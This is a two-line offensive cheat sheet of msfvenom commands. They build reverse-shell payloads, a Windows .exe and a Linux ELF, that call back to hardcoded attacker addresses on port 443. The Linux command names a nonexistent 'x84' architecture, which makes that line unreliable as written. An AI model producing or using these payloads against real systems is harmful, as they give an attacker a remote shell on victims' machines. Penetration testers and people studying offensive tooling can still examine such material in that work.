# For Windows
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe

# For Debian x84 (Not x64)
msfvenom -p linux/x84/shell_reverse_tcp -f elf LHOST=123.123.123.123 LPORT=443 -o shell